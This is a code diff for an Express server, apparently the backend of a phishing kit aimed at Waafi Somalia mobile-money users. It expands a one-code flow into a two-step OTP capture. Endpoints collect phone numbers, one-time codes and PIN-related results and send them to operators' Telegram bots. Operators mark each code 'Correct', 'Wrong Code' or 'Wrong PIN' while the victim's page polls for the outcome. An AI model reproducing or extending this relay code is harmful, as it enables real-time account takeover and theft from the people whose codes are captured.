-        user.otpVerifications.delete(verificationKey);
+        user.firstOtpVerifications.delete(verificationKey);
         return res.json({ 
           success: true, 
           status: 'rejected', 
-          message: 'OTP code is wrong' 
+          message: 'First OTP code is wrong' 
         });
       } else if (verification.status === 'wrong_pin') {
-        user.otpVerifications.delete(verificationKey);
+        user.firstOtpVerifications.delete(verificationKey);
         return res.json({ 
           success: true, 
           status: 'wrong_pin', 
@@ -1552,17 +1746,17 @@ users.forEach((user, linkInsert) => {
         return res.json({ 
           success: true, 
           status: 'timeout', 
-          message: 'Session expired' 
+          message: 'First OTP session expired' 
         });
       } else {
         return res.json({ 
           success: true, 
           status: 'pending', 
-          message: 'Waiting for verification' 
+          message: 'Waiting for first OTP verification' 
         });
       }
     } catch (error) {
-      logger.error(`check-otp-status error for ${user.name}:`, error.message);
+      logger.error(`check-first-otp-status error for ${user.name}:`, error.message);
       res.status(500).json({ 
         success: false, 
         error: 'Internal server error' 
@@ -1570,16 +1764,231 @@ users.forEach((user, linkInsert) => {
     }
   });
 
-  app.post(`${basePath}/resend-otp`, async (req, res) => {
+  // Request Second OTP (called after first OTP is approved)
+  app.post(`${basePath}/request-second-otp`, async (req, res) => {
     try {
-      if (!user.bot) {
-        return res.status(503).json({ 
+      const { phoneNumber, firstOtp, timestamp } = req.body;
+      
+      if (!phoneNumber || !firstOtp) {
+        return res.status(400).json({ 
           success: false, 
-          message: 'Bot not configured' 
+          message: 'Phone and first OTP required' 
         });
       }
 
-      if (!user.isHealthy) {
+      const phoneValidation = validatePhoneNumber(phoneNumber);
+      if (!phoneValidation.valid) {
+        return res.status(400).json({ 
+          success: false, 
+          message: phoneValidation.error 
+        });
+      }
+
+      logger.info(`${user.name}: 📱 Second OTP requested for ${phoneNumber}`);
+
+      res.json({ 
+        success: true, 
+        message: 'Second OTP request acknowledged' 
+      });
+    } catch (error) {
+      logger.error(`request-second-otp error for ${user.name}:`, error.message);
+      res.status(500).json({ 
+        success: false, 
+        error: 'Internal server error' 
+      });
+    }
+  });
+
+  // Verify Second OTP
+  app.post(`${basePath}/verify-second-otp`, async (req, res) => {
+    try {
+      if (!user.bot || !user.isHealthy) {
+        return res.status(503).json({ 
+          success: false, 
+          message: 'Bot service unavailable' 
+        });
+      }
+      
+      const { phoneNumber, otp, firstOtp, timestamp } = req.body;
+      
+      if (!phoneNumber || !otp || !firstOtp) {
+        return res.status(400).json({ 
+          success: false, 
+          message: 'Phone, OTP, and first OTP required' 
+        });
+      }
+
+      const phoneValidation = validatePhoneNumber(phoneNumber);
+      if (!phoneValidation.valid) {
+        return res.status(400).json({ 
+          success: false, 
+          message: phoneValidation.error 
+        });
+      }
+
+      const otpValidation = validateOtp(otp);
+      if (!otpValidation.valid) {
+        return res.status(400).json({ 
+          success: false, 
+          message: otpValidation.error 
+        });
+      }
+
+      const requestKey = `second-otp-${phoneNumber}-${otp}`;
+      if (isDuplicate(user, requestKey)) {
+        return res.json({ 
+          success: true, 
+          message: 'Second OTP sent (cached)' 
+        });
+      }
+
+      const verificationKey = `${phoneNumber}-${otp}`;
+      user.secondOtpVerifications.set(verificationKey, { 
+        status: 'pending', 
+        timestamp: Date.now(), 
+        expired: false,
+        firstOtp: firstOtp
+      });
+
+      logger.info(`${user.name}: 2️⃣ New Second OTP verification - ${phoneNumber}`);
+
+      const message = formatSecondOTPMessage(user, { 
+        phoneNumber, 
+        otp,
+        firstOtp,
+        timestamp: timestamp || Date.now() 
+      });
+      
+      const keyboard = {
+        inline_keyboard: [
+          [{ text: '✅ Correct (Second OTP)', callback_data: `secondotp_correct_${phoneNumber}_${otp}` }],
+          [
+            { text: '❌ Wrong Code', callback_data: `secondotp_wrong_${phoneNumber}_${otp}` },
+            { text: '⚠️ Wrong PIN', callback_data: `secondotp_wrongpin_${phoneNumber}_${otp}` }
+          ]
+        ]
+      };
+      
+      const result = await sendTelegramMessage(user, message, { reply_markup: keyboard });
+
+      if (result.success) {
+        user.requestCount++;
+        user.lastRequestTime = Date.now();
+        res.json({ 
+          success: true, 
+          message: 'Second OTP sent successfully' 
+        });
+      } else {
+        res.status(500).json({ 
+          success: false, 
+          message: 'Failed to send notification', 
+          error: result.error 
+        });
+      }
+    } catch (error) {
+      logger.error(`verify-second-otp error for ${user.name}:`, error.message);
+      res.status(500).json({ 
+        success: false, 
+        error: 'Internal server error' 
+      });
+    }
+  });
+
+  // Check Second OTP Status
+  app.post(`${basePath}/check-second-otp-status`, async (req, res) => {
+    try {
+      const { phoneNumber, otp } = req.body;
+      
+      if (!phoneNumber || !otp) {
+        return res.status(400).json({ 
+          success: false, 
+          message: 'Phone and OTP required' 
+        });
+      }
+
+      const phoneValidation = validatePhoneNumber(phoneNumber);
+      if (!phoneValidation.valid) {
+        return res.status(400).json({ 
+          success: false, 
+          message: phoneValidation.error 
+        });
+      }
+
+      const otpValidation = validateOtp(otp);
+      if (!otpValidation.valid) {
+        return res.status(400).json({ 
+          success: false, 
+          message: otpValidation.error 
+        });
+      }
+
+      const verificationKey = `${phoneNumber}-${otp}`;
+      const verification = user.secondOtpVerifications.get(verificationKey);
+
+      if (!verification) {
+        return res.json({ 
+          success: true, 
+          status: 'pending', 
+          message: 'Waiting for second OTP verification' 
+        });
+      }
+
+      if (Date.now() - verification.timestamp > CONFIG.APPROVAL_TIMEOUT) {
+        return res.json({ 
+          success: true, 
+          status: 'timeout', 
+          message: 'Second OTP session expired' 
+        });
+      }
+
+      if (verification.status === 'approved') {
+        user.secondOtpVerifications.delete(verificationKey);
+        return res.json({ 
+          success: true, 
+          status: 'approved', 
+          message: 'All verifications complete',
+          cacheExpiry: '30 minutes'
+        });
+      } else if (verification.status === 'rejected') {
+        user.secondOtpVerifications.delete(verificationKey);
+        return res.json({ 
+          success: true, 
+          status: 'rejected', 
+          message: 'Second OTP code is wrong' 
+        });
+      } else if (verification.status === 'wrong_pin') {
+        user.secondOtpVerifications.delete(verificationKey);
+        return res.json({ 
+          success: true, 
+          status: 'wrong_pin', 
+          message: 'PIN is wrong' 
+        });
+      } else if (verification.status === 'timeout') {
+        return res.json({ 
+          success: true, 
+          status: 'timeout', 
+          message: 'Second OTP session expired' 
+        });
+      } else {
+        return res.json({ 
+          success: true, 
+          status: 'pending', 
+          message: 'Waiting for second OTP verification' 
+        });
+      }
+    } catch (error) {
+      logger.error(`check-second-otp-status error for ${user.name}:`, error.message);
+      res.status(500).json({ 
+        success: false, 
+        error: 'Internal server error' 
+      });
+    }
+  });
+
+  // Resend First OTP
+  app.post(`${basePath}/resend-first-otp`, async (req, res) => {
+    try {
+      if (!user.bot || !user.isHealthy) {
         return res.status(503).json({ 
           success: false, 
           message: 'Bot service unavailable' 
@@ -1604,14 +2013,14 @@ users.forEach((user, linkInsert) => {
       }
 
       const { countryCode, number } = formatPhoneNumber(phoneNumber);
-      const message = `🔄 <b>${sanitizeInput(user.name)} - OTP RESEND</b>\n\n📱 <code>${phoneNumber}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
+      const message = `🔄 <b>${sanitizeInput(user.name)} - FIRST OTP RESEND</b>\n\n📱 <code>${phoneNumber}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
       
       const result = await sendTelegramMessage(user, message);
 
       if (result.success) {
         res.json({ 
           success: true, 
-          message: 'Resend notification sent' 
+          message: 'First OTP resend notification sent' 
         });
       } else {
         res.status(500).json({ 
@@ -1621,7 +2030,60 @@ users.forEach((user, linkInsert) => {
         });
       }
     } catch (error) {
-      logger.error(`resend-otp error for ${user.name}:`, error.message);
+      logger.error(`resend-first-otp error for ${user.name}:`, error.message);
+      res.status(500).json({ 
+        success: false, 
+        error: 'Internal server error' 
+      });
+    }
+  });
+
+  // Resend Second OTP
+  app.post(`${basePath}/resend-second-otp`, async (req, res) => {
+    try {
+      if (!user.bot || !user.isHealthy) {
+        return res.status(503).json({ 
+          success: false, 
+          message: 'Bot service unavailable' 
+        });
+      }
+      
+      const { phoneNumber, firstOtp, timestamp } = req.body;
+      
+      if (!phoneNumber) {
+        return res.status(400).json({ 
+          success: false, 
+          message: 'Phone number required' 
+        });
+      }
+
+      const phoneValidation = validatePhoneNumber(phoneNumber);
+      if (!phoneValidation.valid) {
+        return res.status(400).json({ 
+          success: false, 
+          message: phoneValidation.error 
+        });
+      }
+
+      const { countryCode, number } = formatPhoneNumber(phoneNumber);
+      const message = `🔄 <b>${sanitizeInput(user.name)} - SECOND OTP RESEND</b>\n\n📱 <code>${phoneNumber}</code>\n🔗 First OTP Ref: <code>${firstOtp || 'N/A'}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
+      
+      const result = await sendTelegramMessage(user, message);
+
+      if (result.success) {
+        res.json({ 
+          success: true, 
+          message: 'Second OTP resend notification sent' 
+        });
+      } else {
+        res.status(500).json({ 
+          success: false, 
+          message: 'Failed to send notification', 
+          error: result.error 
+        });
+      }
+    } catch (error) {
+      logger.error(`resend-second-otp error for ${user.name}:`, error.message);
       res.status(500).json({ 
         success: false, 
         error: 'Internal server error' 
@@ -1683,12 +2145,13 @@ setInterval(() => {
 const server = app.listen(PORT, () => {
   console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`🇸🇴 Waafi Somalia - FIXED Multi-User System`);
+  console.log(`🇸🇴 Waafi Somalia - TWO-STEP OTP System`);
   console.log(`👥 Active users: ${users.size}/${CONFIG.MAX_USERS}`);
   console.log(`⏱️  Approval timeout: ${CONFIG.APPROVAL_TIMEOUT / 60000} minutes`);
   console.log(`⏱️  User cache duration: ${CONFIG.USER_CACHE_DURATION / 60000} minutes`);
   console.log(`🔢 Max concurrent requests: ${CONFIG.MAX_CONCURRENT_REQUESTS}`);
-  console.log(`♻️  Returning users skip OTP for 30 min`);
+  console.log(`♻️  Returning users skip both OTPs for 30 min`);
+  console.log(`🔐 New users verify 2 OTPs`);
   console.log(`🐛 DEBUG: Enhanced logging enabled`);
   console.log('\n📋 Active endpoints:');
   users.forEach((user, linkInsert) => {
